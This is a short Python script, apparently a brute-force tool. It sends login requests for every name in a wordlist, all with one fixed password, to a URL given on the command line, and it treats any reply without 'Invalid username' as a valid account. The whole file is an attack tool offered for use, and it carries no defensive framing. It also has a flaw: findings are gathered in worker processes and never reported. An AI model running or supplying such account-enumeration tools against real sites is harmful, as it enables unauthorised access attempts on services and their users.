import requests
import multiprocessing
import argparse


class BF:
    def __init__(self, file: str, url: str):
        self.words_filepath = file
        self.url_login = url
        self.words = []
        self.set_words()
        self.results = []

    def set_words(self):
        with open(self.words_filepath, 'r', errors='replace') as f:
            self.words = [x.replace('\n', '') for x in f.readlines()]

    def login_process(self, username):
        print(username)
        r = requests.post(self.url_login, data={
            "username": username,
            "password": "123456789"
        })
        if not "Invalid username" in r.text:
            self.results.append(username)

    def run(self):
        p = multiprocessing.Pool(30)
        p.map(self.login_process, self.words)
        p.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--file', '-f', help='List file to use', required=True)
    parser.add_argument('--url', '-u', help='Url to bruteforce', required=True)
    args = parser.parse_args()

    bf = BF(file=args.file, url=args.url)
    print('Bruteforce attack will try {0} alternatives'.format(len(bf.words)))
    bf.run()
